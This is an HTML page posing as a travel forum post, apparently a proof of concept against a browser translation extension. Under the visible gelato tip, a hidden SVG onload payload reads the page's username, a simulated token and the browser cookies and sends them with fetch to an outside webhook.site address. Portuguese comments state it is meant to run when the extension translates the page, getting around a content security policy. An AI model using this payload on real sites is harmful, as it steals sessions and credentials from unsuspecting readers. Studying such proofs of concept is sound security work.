<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Forum Post ‚Äì Travel Tips</title>
  <!-- CSP que bloquearia execu√ß√£o JS normalmente -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self';">

  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: #f8f9fa;
    }
    .post {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .author {
      font-weight: bold;
      margin-bottom: 10px;
    }
    #token {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Travel Forum</h1>
  <div class="post">
    <div class="author" id="user">User123:</div>
    <div class="content">
      Here's a cool travel tip!<br><br>

      <!-- Token simulado (como um JWT, CSRF token, etc.) -->
      <div id="token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload.signature</div>

      <!-- Payload SVG que executa JS via onload ao traduzir com a extens√£o -->
      <svg onload="
        fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?' +
          new URLSearchParams({
            user: document.getElementById('user')?.innerText,
            token: document.getElementById('token')?.innerText,
            cookies: document.cookie || 'No cookies'
          })
        )
      ">
        <!-- visualmente inofensivo -->
      </svg>

      <p>If you're visiting Italy, make sure to try the gelato! üç¶</p>
    </div>
  </div>
</body>
</html>
